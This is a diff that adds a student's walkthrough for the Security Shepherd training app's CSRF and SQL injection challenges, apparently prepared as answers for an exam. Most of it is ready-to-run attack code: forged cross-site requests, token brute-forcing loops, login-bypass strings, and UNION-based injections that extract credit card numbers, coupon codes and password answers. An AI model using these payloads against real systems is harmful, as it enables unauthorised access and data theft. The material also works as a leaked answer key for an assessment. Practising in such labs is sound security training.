@@ -1,0 +1,439 @@
+Security Sheperd
+CSRF total 9 types 
+
+Create 2 accounts in security shepherd
+One with your usn and other dummy acc
+
+In ur acc for csrf challenge they provide you the url either get or post request
+ 
+Something like this get request
+
+Go to the other dummy acc and in the same logged in page paste the the following link
+“https://localhost:8444/user/csrfchallengeone/plusplus?userid=ba93aa273227a7c7b4f66ce28f0723e5c777ed9d” just change the ip address and port and your userID to the main account , then enter it will show increment successful.
+ Go back to main account check score board
+
+IF it is post request 
+
+Open console in the dummy acc browser 
+
+Then use fetch function for example 
+
+
+
+
+
+
+
+
+fetch('/user/csrfchallengetwo/plusplus', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: 'userid=ba93aa273227a7c7b4f66ce28f0723e5c777ed9d'
+})
+.then(r => r.text())
+.then(console.log);
+
+
+In the challenge page observe the body key values sometimes it is userid or userId
+
+In some challenges it requires CSRF TOKEN it will be provided in Chanllenge page itself or you need to view page souce to get that token and modify and paste the below fetch function in the from the dummy account browser
+
+fetch('/user/csrfchallengethree/plusplus', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: 'userid=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=PASTE_TOKEN_HERE'
+})
+.then(r => r.text())
+.then(console.log);
+
+Careful with userId or userid it will be mentioned in challenge page itself
+
+Some times csrf token will be just 1,2,3 etc use the below fetch function
+If the challenge says CSRF 5
+
+
+
+
+
+
+
+
+
+
+
+[0, 1, 2].forEach(token => {
+  fetch('/user/csrfchallengefive/plusplus', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: `userId=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=${token}`
+  })
+  .then(r => r.text())
+  .then(text => console.log('Token:', token, 'Response:', text));
+});
+
+
+CSRF 6
+Use fetch function find the hidden csrf token in page source
+fetch('/user/csrfchallengesix/plusplus', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: 'userId=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=PASTE_TOKEN_HERE'
+})
+.then(r => r.text())
+.then(console.log);
+
+For CSRF 6 the following are only 3 tokens use in exam it might be any one of them
+c4ca4238a0b923820dcc509a6f75849b
+eccbc87e4b5ce2fe28308fd9f2a7baf3
+c81e728d9d4c2f636f067f89cc14862c
+
+
+
+
+
+
+
+
+
+
+
+Use for loop with fetch function
+
+const userId = '61111c7bc5137e7e275289a1d4e413a02a7b6ec7';
+
+const tokens = [
+  'c4ca4238a0b923820dcc509a6f75849b',
+  'eccbc87e4b5ce2fe28308fd9f2a7baf3',
+  'c81e728d9d4c2f636f067f89cc14862c'
+];
+
+tokens.forEach(token => {
+  const data = new URLSearchParams();
+  data.set('userId', userId);
+  data.set('csrfToken', token);
+
+  fetch('/user/csrfchallengesix/plusplus', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: data.toString()
+  })
+  .then(r => r.text())
+  .then(text => console.log('Token:', token, 'Response:', text));
+});
+
+
+CSRF JSON challenge
+
+fetch('/user/csrfchallengejson/plusplus', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    userId: '61111c7bc5137e7e275289a1d4e413a02a7b6ec7'
+  })
+})
+.then(r => r.text())
+.then(console.log);
+
+SOME TIMES IT WILL SAY INCREMENT FAILED YOUR NEW TOKEN IS -274732….. Use this new token and modify fetch function to send new request using new token
+
+
+
+SQLi or SQL INJECTION
+
+
+SQL 1
+
+Use the following  in the input box
+
+' OR '1'='1' -- 
+' OR 1=1 -- 
+1 OR 1=1 -- 
+' OR 1=1 #
+
+
+SQL 2
+USE THIS IN INPUT BOX
+
+' OR '1'='1
+x@x'or'1'='1
+1'or'1@1.1
+a'!='1@1.1
+
+
+SQL3
+
+First type the given name in challenge box
+
+Then go to network tab in dev tools then look at recent network log right click copy then copy as fetch use gpt 
+
+
+
+
+fetch("https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": "\"Android\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  "referrer": "https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6.jsp",
+  "body": "theUserName=Mary+martin",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+
+Put this to gpt and state the challenge it will provide you with something as follow
+
+const data = new URLSearchParams();
+
+data.set(
+  "theUserName",
+  "Mary Martin' UNION SELECT creditcardnumber FROM customers WHERE customerName='Mary Martin' #"
+);
+
+fetch("https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6", {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  referrer: "https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6.jsp",
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+SQL4
+Same as above type something like ‘ OR username=’admin’ –
+
+Then go to network tab in dev tools copy as fetch then give it to gpt it should give you something as below
+
+const data = new URLSearchParams();
+
+data.set("theUserName", "\\");
+data.set("thePassword", ' or username="admin";-- -');
+
+fetch("https://127.0.0.1:8444/challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629", {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  referrer: "https://127.0.0.1:8444/challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629.jsp",
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+
+
+
+
+
+SQL5
+
+Coupon code
+
+To get coupon code use the below fetch function
+const data = new URLSearchParams();
+
+data.set(
+  "couponCode",
+  "x' UNION SELECT 1,100,couponCode FROM vipCoupons -- "
+);
+
+fetch("https://127.0.0.1:8444/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck", {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+Use that coupon code paste it in challenge page make any item quantity 1 and click the button u r done
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SQL 6
+First check column name using this function
+
+
+const url = "https://127.0.0.1:8444/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2";
+
+const data = new URLSearchParams();
+
+data.set(
+  "pinNumber",
+  "\\x27 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=\\x27users\\x27 -- "
+);
+
+fetch(url, {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+
+Then use the following fetch function
+
+
+const url = "https://127.0.0.1:8444/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2";
+
+const data = new URLSearchParams();
+
+data.set(
+  "pinNumber",
+  "\\x27 UNION SELECT userAnswer FROM users WHERE userName=\\x27Brendan\\x27 -- "
+);
+
+fetch(url, {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+Or this
+
+const url = "https://127.0.0.1:8444/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2";
+
+const data = new URLSearchParams();
+
+data.set(
+  "pinNumber",
+  "\\x27 UNION SELECT userAnswer FROM users WHERE userName=\\x27brendan\\x27 -- "
+);
+
+fetch(url, {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+SQL7
+
+const url = "https://127.0.0.1:8444/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced";
+
+const data = new URLSearchParams();
+
+data.set("subEmail", `"x' OR 1=1 OR 'a'='b"@x.x`);
+data.set("subPassword", "test");
+
+fetch(url, {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  referrer: "https://127.0.0.1:8444/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced.jsp",
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+Or this 
+
+const url = "https://127.0.0.1:8444/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced";
+
+const data = new URLSearchParams();
+
+data.set("subEmail", `"x' OR userName='admin' OR 'a'='b"@x.x`);
+data.set("subPassword", "test");
+
+fetch(url, {
+  headers: {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  body: data.toString(),
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log);
+
+
+SQLInjection escape
+\' OR 1=1 -- 
+\' OR 'a'='a' -- 
+\' OR 2>1 -- 
